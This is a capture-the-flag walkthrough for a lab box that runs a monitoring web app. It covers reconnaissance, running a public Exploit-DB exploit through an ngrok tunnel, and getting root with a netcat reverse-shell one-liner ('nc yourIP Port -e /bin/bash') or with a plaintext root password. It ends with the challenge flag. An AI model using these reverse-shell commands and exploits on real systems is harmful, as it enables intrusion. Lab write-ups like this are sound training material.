# Welcome to Secured-Monitor Solution

After pasting the 3 flags you had got the IP of the box i.e. `100.27.12.78`

# Recon

Lets get started with nmap as always and we get port 80 open thats great!

![Port Scan](https://i.ibb.co/6RvyYyD/portscan.jpg)

Now lets go to `http://100.27.12.78/` we see a default ubuntu page!

![Default Ubuntu Page](https://i.ibb.co/DLbXPPq/default-ubuntu.jpg)

We have a /robots.txt but thats useless.

Dirbuster it 

![Dirburst](https://i.ibb.co/5spR4MY/dirblast.jpg)

and we get a juicy file at `http://100.27.12.78/monitor/`

![Monitor Page](https://i.ibb.co/jMbv3JP/monitor1.jpg)

At the end we see there is a version `1.7.6m` and a login page!

The version that made me trigger that its not custom made lets google about it!

We find something interesting!

![ExploitDB](https://i.ibb.co/rb7HnWP/exploitdb.jpg)

lets run it :3 with netcat and ngrok (incase if you dont have)

# Exploitation

Run the python exploit which we have got from `https://www.exploit-db.com/exploits/48980`

##Command to run

`python expl.py http://100.27.12.78/monitor/ 2.tcp.ngrok.io 10090`

In the netcat we get a reverse shell :3

![Rev SHell](https://i.ibb.co/mzJVYnv/reverse-shell.jpg)

On crawling around the server we find that the `root.txt` but we cannot read it as we are `www-data`


# Privelege Escalation

So I have 2 different ways of privelege escalation

i> Intended Way
ii> Unintended Way

## Intended Way

There is a file called `todo.txt`

On opening we see

```
www-data@ip-172-31-57-243:/home$ cat todo.txt
Always read books from library especially OS books!
You can also try the most simplest encryption method!
```

Interesting!

We also see a program called `devs_note.py`

![devs_note](https://i.ibb.co/q7kd1QY/devsnote.jpg)

From `todo.txt` we see read about OS which is a python module imported in program!

If we run `linenum.sh` we see that the module `os.py` and `base64.py` have root priveleges and also that `devs_note.py` is running in a process. So if we call os.system() we can get root priv.

Create a new file called `somename.py` with content

```
import os

os.system("nc yourIP Port -e /bin/bash")

````

Run it we get root shell and read the `root.txt` 

![root_flag](https://i.ibb.co/ZYSHQZ0/root.jpg)

## UnIntended Way

If you have ever thought of bypassing the login somehow at `http://100.27.12.78/monitor/settings.php` Then you might have thought that there was a database!
 
Even at the login page there were the location of the database given

![database_location](https://i.ibb.co/Gk3ZzvD/database-location.jpg)

As we had the user `www-data` we can go and read the file `users.db`

![userdb](https://i.ibb.co/Wg109HC/userdb.jpg)

If we decrypt the hash we get result as `darkhaxor` but its not the password but there is also a `user_bckup.db.txt`

where we have the root password in clear text

![rootPass](https://i.ibb.co/n0Cnxgr/root-pass.jpg)

Root owned!

### Flag ~

`sudoflaws{M0ni7oring_m3_huhhh!_Good_k33p_i7_up}`


If you really like my box! Drop a review at `aakashadhikari786@gmail.com`












